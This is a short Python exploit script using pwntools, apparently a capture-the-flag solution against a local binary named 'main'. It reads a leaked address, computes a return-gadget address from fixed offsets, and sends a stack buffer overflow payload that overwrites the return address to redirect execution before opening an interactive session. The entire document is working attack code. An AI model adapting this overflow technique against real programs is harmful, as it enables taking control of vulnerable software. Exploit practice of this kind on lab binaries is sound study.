from pwn import*

elf = context.binary = ELF('./main')
p = process()

p.recvuntil(b'help you: ')
iset = int(p.recvline().strip(), 16)
ret = iset - 0x1219 + 0x12c1
payload = b'A' * 0x18 + p64(ret) + p64(iset)

p.sendline(payload)
p.interactive()
